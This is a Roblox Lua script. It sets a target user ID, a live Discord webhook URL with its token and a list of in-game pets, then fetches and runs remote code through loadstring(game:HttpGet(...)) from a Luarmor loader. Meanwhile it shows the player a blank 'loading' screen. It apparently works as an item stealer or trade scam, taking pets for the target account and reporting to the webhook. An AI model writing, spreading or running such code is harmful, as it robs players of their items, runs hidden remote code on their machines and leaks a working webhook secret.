getgenv().targetUserId = rzgr1ks
getgenv().webhookURL = "https://discord.com/api/webhooks/1478495703822110731/-YzX6BprkXMNpejVVFWJDch-TuTtfUZVbILQXUmZavGmKwTT3G556xcTli2ijJIImv1F"
getgenv().whitelistBrainrot = {
    ["Skibidi Toilet"] = true,
    ["Dragon Cannelloni"] = true,
    ["Meowl"] = true,
    ["Garama and Madundung"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Capitano Moby"] = true,
    ["Headless Horseman"] = true,
}

loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/f8227db06cefdc7b56ea6a3e7d4272de.lua"))()
--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 3 | Scripts: 0 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.ScreenGui.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2"]["Size"] = UDim2.new(0, 309, 0, 254);
G2L["2"]["Position"] = UDim2.new(0.2968, 0, 0.23864, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.ScreenGui.TextLabel
G2L["3"] = Instance.new("TextLabel", G2L["1"]);
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["TextSize"] = 14;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Text"] = [[loading]];
G2L["3"]["Position"] = UDim2.new(0.3633, 0, 0.40422, 0);



return G2L["1"], require;
